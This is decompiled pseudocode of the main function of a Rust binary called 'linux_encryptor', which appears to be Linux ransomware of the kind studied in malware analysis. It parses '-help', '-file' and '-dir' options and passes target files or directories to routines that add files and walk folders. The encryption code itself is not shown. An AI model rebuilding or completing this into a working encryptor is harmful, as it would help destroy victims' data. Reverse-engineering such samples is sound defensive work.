void linux_encryptor::main()
{
  __int64 v0; // r12
  unsigned __int64 v1; // rbp
  __int64 v2; // r14
  __int64 v3; // r13
  unsigned __int64 v4; // r15
  unsigned __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rax
  char v8; // al
  const void *v9; // rsi
  size_t v10; // rbp
  const void *v11; // r12
  void *v12; // rax
  void *v13; // r12
  char v14; // al
  const void *v15; // r12
  size_t v16; // rbx
  void *v17; // rax
  void *v18; // rbp
  __int64 v19; // rbx
  __int64 v20; // rbp
  __int64 v21; // rbx
  __int64 v22; // rbp
  __int128 v23; // [rsp+0h] [rbp-C8h] BYREF
  __int128 v24; // [rsp+10h] [rbp-B8h]
  __int128 *v25; // [rsp+20h] [rbp-A8h]
  __int64 (__fastcall *v26)(); // [rsp+28h] [rbp-A0h]
  __int128 v27; // [rsp+38h] [rbp-90h] BYREF
  __int128 v28; // [rsp+48h] [rbp-80h]
  __int128 *v29; // [rsp+58h] [rbp-70h]
  __int64 v30; // [rsp+60h] [rbp-68h]
  __int64 v31; // [rsp+68h] [rbp-60h]
  unsigned __int64 v32; // [rsp+70h] [rbp-58h]
  __int64 v33; // [rsp+78h] [rbp-50h]
  __int64 v34; // [rsp+80h] [rbp-48h] BYREF
  __int64 v35; // [rsp+88h] [rbp-40h]
  unsigned __int64 v36; // [rsp+90h] [rbp-38h]

  std::env::args();
  v24 = v28;
  v23 = v27;
  ((void (__fastcall *)(__int64 *, __int128 *))<alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter)(
    &v34,
    &v23);
  v0 = v34;
  v1 = v36;
  if ( v36 )
  {
    v2 = v34 + 24;
    v31 = 8 * v36;
    v3 = 24 * v36;
    v4 = 0LL;
    v33 = v34;
    v32 = v36;
    do
    {
      v5 = v4++;
      v6 = *(_QWORD *)(v2 - 8);
      if ( v6 == 5 )
      {
        v7 = *(_QWORD *)(v2 - 24);
        if ( !(*(_DWORD *)v7 ^ 0x6C65682D | *(unsigned __int8 *)(v7 + 4) ^ 0x70) )
          goto LABEL_35;
        if ( !(*(_DWORD *)v7 ^ 0x6C69662D | *(unsigned __int8 *)(v7 + 4) ^ 0x65) )
        {
          if ( v1 <= v4 )
            core::panicking::panic_bounds_check();
          std::path::Path::is_file();
          if ( v8 )
          {
            if ( v1 <= v5 )
              core::panicking::panic_bounds_check();
            if ( v1 <= v4 )
              core::panicking::panic_bounds_check();
            *(_QWORD *)&v23 = v0;
            *((_QWORD *)&v23 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
            *(_QWORD *)&v24 = v2 - 24;
            *((_QWORD *)&v24 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
            v25 = (__int128 *)v2;
            v26 = <alloc::string::String as core::fmt::Display>::fmt;
            *(_QWORD *)&v27 = &off_74480;
            *((_QWORD *)&v27 + 1) = 4LL;
            *(_QWORD *)&v28 = 0LL;
            v29 = &v23;
            v30 = 3LL;
            std::io::stdio::_print();
            v9 = *(const void **)v2;
            v10 = *(_QWORD *)(v2 + 16);
            if ( v10 )
            {
              v11 = *(const void **)v2;
              _rust_alloc();
              v9 = v11;
              v13 = v12;
              if ( !v12 )
                alloc::alloc::handle_alloc_error();
            }
            else
            {
              v13 = &dword_0 + 1;
            }
            memcpy(v13, v9, v10);
            *(_QWORD *)&v23 = v13;
            *((_QWORD *)&v23 + 1) = v10;
            *(_QWORD *)&v24 = v10;
            linux_encryptor::files::add_file((__int64)&v23);
            v0 = v33;
            v1 = v32;
            if ( *((_QWORD *)&v23 + 1) )
              _rust_dealloc();
          }
          else
          {
            if ( v1 <= v4 )
              core::panicking::panic_bounds_check();
            *(_QWORD *)&v27 = v2;
            *((_QWORD *)&v27 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
            *(_QWORD *)&v23 = &off_74508;
            *((_QWORD *)&v23 + 1) = 2LL;
            *(_QWORD *)&v24 = 0LL;
            v25 = &v27;
            v26 = (__int64 (__fastcall *)())(&dword_0 + 1);
            std::io::stdio::_print();
          }
        }
        v6 = *(_QWORD *)(v2 - 8);
      }
      if ( v6 == 4 && **(_DWORD **)(v2 - 24) == 1919509549 )
      {
        if ( v1 <= v4 )
          core::panicking::panic_bounds_check();
        std::path::Path::is_dir();
        if ( v14 )
        {
          if ( v1 <= v5 )
            core::panicking::panic_bounds_check();
          if ( v1 <= v4 )
            core::panicking::panic_bounds_check();
          *(_QWORD *)&v23 = v0;
          *((_QWORD *)&v23 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
          *(_QWORD *)&v24 = v2 - 24;
          *((_QWORD *)&v24 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
          v25 = (__int128 *)v2;
          v26 = <alloc::string::String as core::fmt::Display>::fmt;
          *(_QWORD *)&v27 = &off_74480;
          *((_QWORD *)&v27 + 1) = 4LL;
          *(_QWORD *)&v28 = 0LL;
          v29 = &v23;
          v30 = 3LL;
          std::io::stdio::_print();
          v15 = *(const void **)v2;
          v16 = *(_QWORD *)(v2 + 16);
          if ( v16 )
          {
            _rust_alloc();
            v18 = v17;
            if ( !v17 )
              alloc::alloc::handle_alloc_error();
          }
          else
          {
            v18 = &dword_0 + 1;
          }
          memcpy(v18, v15, v16);
          *(_QWORD *)&v23 = v18;
          *((_QWORD *)&v23 + 1) = v16;
          *(_QWORD *)&v24 = v16;
          linux_encryptor::files::walk_dir();
          v0 = v33;
          v1 = v32;
          if ( *((_QWORD *)&v23 + 1) )
            _rust_dealloc();
        }
        else
        {
          if ( v1 <= v4 )
            core::panicking::panic_bounds_check();
          *(_QWORD *)&v27 = v2;
          *((_QWORD *)&v27 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
          *(_QWORD *)&v23 = &off_745A0;
          *((_QWORD *)&v23 + 1) = 2LL;
          *(_QWORD *)&v24 = 0LL;
          v25 = &v27;
          v26 = (__int64 (__fastcall *)())(&dword_0 + 1);
          std::io::stdio::_print();
        }
      }
      v2 += 24LL;
      v3 -= 24LL;
    }
    while ( v3 );
    if ( v1 == 1 )
    {
LABEL_35:
      *(_QWORD *)&v23 = &off_74418;
      *((_QWORD *)&v23 + 1) = 1LL;
      *(_QWORD *)&v24 = 0LL;
      v25 = (__int128 *)&unk_537D0;
      v26 = 0LL;
      std::io::stdio::_print();
      *(_QWORD *)&v27 = v0;
      *((_QWORD *)&v27 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)&v23 = &off_74428;
      *((_QWORD *)&v23 + 1) = 2LL;
      *(_QWORD *)&v24 = 0LL;
      v25 = &v27;
      v26 = (__int64 (__fastcall *)())(&dword_0 + 1);
      std::io::stdio::_print();
      *(_QWORD *)&v27 = v0;
      *((_QWORD *)&v27 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)&v23 = &off_74448;
      *((_QWORD *)&v23 + 1) = 2LL;
      *(_QWORD *)&v24 = 0LL;
      v25 = &v27;
      v26 = (__int64 (__fastcall *)())(&dword_0 + 1);
      std::io::stdio::_print();
      if ( v1 )
      {
        v19 = 3 * v31;
        v20 = 0LL;
        do
        {
          if ( *(_QWORD *)(v0 + v20 + 8) )
            _rust_dealloc();
          v20 += 24LL;
        }
        while ( v19 != v20 );
      }
      goto LABEL_45;
    }
    if ( v1 )
    {
      v21 = 3 * v31;
      v22 = 0LL;
      do
      {
        if ( *(_QWORD *)(v0 + v22 + 8) )
          _rust_dealloc();
        v22 += 24LL;
      }
      while ( v21 != v22 );
    }
  }
LABEL_45:
  if ( v35 )
  {
    if ( 24 * v35 )
      _rust_dealloc();
  }
}
